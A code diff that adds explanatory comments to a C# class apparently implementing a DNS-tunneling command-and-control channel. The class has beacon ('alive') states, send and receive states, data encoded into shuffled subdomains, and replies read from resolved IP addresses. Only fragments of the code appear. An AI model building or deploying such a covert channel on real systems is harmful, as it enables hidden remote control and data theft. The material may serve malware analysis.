@@ -6,6 +6,11 @@ namespace Alien
 {
 	internal class DnsClass
 	{
+		/**
+		 * Function on alive state
+		 * 
+		 * @return MachineCommand command to move to another state
+		 */
 		public static MachineCommand Alive()
 		{
 			MachineCommand ret = MachineCommand.Failed;
@@ -17,6 +22,11 @@ namespace Alien
 			return ret;
 		}
 
+		/**
+		 * Function on Receive state
+		 * 
+		 * @return MachineCommand command to move to another state
+		 */
 		internal static MachineCommand Receive()
 		{
 			MachineCommand ret = MachineCommand.Failed;
@@ -28,6 +38,13 @@ namespace Alien
 			return ret;
 		}
 
+		/**
+		 * Low level function to retreive data from resolved IP
+		 * 
+		 * @param out MachineCommand reference to save command
+		 * 
+		 * @return bool success on retreiving data
+		 */
 		private static bool _Receive(out MachineCommand ret)
 		{
 			DnsClass._DomainMaker(
@@ -44,6 +61,13 @@ namespace Alien
 			return flag;
 		}
 
+		/**
+		 * Low level function to process and append received data
+		 * 
+		 * @param byte[] data - received data
+		 * 
+		 * @return bool success on processing data
+		 */
 		private static bool _ProcessData(byte[] data)
 		{
 			int val = DnsClass._ReceiveDataSize - DnsClass._ReceiveByteIndex;
@@ -63,6 +87,11 @@ namespace Alien
 			return false;
 		}
 
+		/**
+		 * Function on Send state
+		 * 
+		 * @return MachineCommand command to move to another state
+		 */
 		internal static MachineCommand Send()
 		{
 			MachineCommand ret = MachineCommand.Failed;
@@ -76,6 +105,13 @@ namespace Alien
 			return ret;
 		}
 
+		/**
+		 * Low level function to send data
+		 * 
+		 * @param out MachineCommand reference to save command
+		 * 
+		 * @return bool success on sending data
+		 */
 		private static bool _Send(out MachineCommand ret)
 		{
 			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
@@ -110,6 +146,13 @@ namespace Alien
 			return flag;
 		}
 
+		/**
+		 * Function that checks if sending cycle is end
+		 * 
+		 * @param int sendlen length of data to send
+		 * 
+		 * @return bool ended or not
+		 */
 		private static bool _CheckSend(int sendLen)
 		{
 			DnsClass._SendByteIndex += sendLen;
@@ -123,6 +166,11 @@ namespace Alien
 			return false;
 		}
 
+		/**
+		 * Function on SendAndReceive state
+		 * 
+		 * @return MachineCommand command to move to another state
+		 */
 		internal static MachineCommand SendAndReceive()
 		{
 			MachineCommand ret = MachineCommand.Failed;
@@ -136,6 +184,13 @@ namespace Alien
 			return ret;
 		}
 
+		/**
+		 * Low level function to send and receive data
+		 * 
+		 * @param out MachineCommand reference to save command
+		 * 
+		 * @return bool success on sending and receiving data
+		 */
 		private static bool _SendAndReceive(out MachineCommand ret)
 		{
 			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
@@ -168,6 +223,13 @@ namespace Alien
 			return flag;
 		}
 
+		/**
+		 * Low level function to try running argument
+		 * 
+		 * @param Func<bool> fn - function to run
+		 * 
+		 * @return bool success of running
+		 */
 		private static bool _TryMe(Func<bool> fn)
 		{
 			bool result = false;
@@ -187,6 +249,14 @@ namespace Alien
 			}
 			return result;
 		}
+
+		/**
+		 * Low level function to process on first alive state
+		 * 
+		 * @param out MachineCommand ret - command to return
+		 * 
+		 * @return bool result on state
+		 */
 		private static bool _FirstAlive()
 		{
 			DnsClass._DomainMaker(Enums.DomainType.FirstAlive, Config.FirstAliveKey);
@@ -198,6 +268,14 @@ namespace Alien
 			}
 			return flag;
 		}
+
+		/**
+		 * Low level function to process on alive state
+		 * 
+		 * @param out MachineCommand ret - command to return
+		 * 
+		 * @return bool result on state
+		 */
 		private static bool _MainAlive(out MachineCommand ret)
 		{
 			DnsClass._DomainMaker(Enums.DomainType.MainAlive, string.Empty);
@@ -210,6 +288,14 @@ namespace Alien
 			}
 			return flag;
 		}
+
+		/**
+		 * Function to prepare for receiving
+		 * 
+		 * @param byte[] response - resolved IP
+		 * 
+		 * @return bool success on preparing data
+		 */
 		private static bool _InitReceive(byte[] response)
 		{
 			if (response[0] >= 128)
@@ -222,6 +308,14 @@ namespace Alien
 			return false;
 		}
 
+		/**
+		 * Function that makes subdomain by alphabet shuffle
+		 * 
+		 * @param Enums.DomainType domainType - type of domain to be made
+		 * @param string data - data to encode in domain
+		 * 
+		 * @return none
+		 */
 		private static void _DomainMaker(Enums.DomainType domainType, string data)
 		{
 			if (DnsClass._Try == 0)
@@ -243,6 +337,13 @@ namespace Alien
 			}
 		}
 
+		/**
+		 * Low level function to resolve domain
+		 * 
+		 * @param out byte[] response - resolved IP
+		 * 
+		 * @return bool success on resolving domain
+		 */
 		private static bool _Resolver(out byte[] response)
 		{
 			bool result = true;
@@ -263,6 +364,13 @@ namespace Alien
 			return result;
 		}
 
+		/**
+		 * Function to prepare for sending
+		 * 
+		 * @param byte[] sendData - bytes for sending
+		 * 
+		 * @return none
+		 */
 		public static void ReadySend(byte[] sendData)
 		{
 			DnsClass._SendByteIndex = 0;
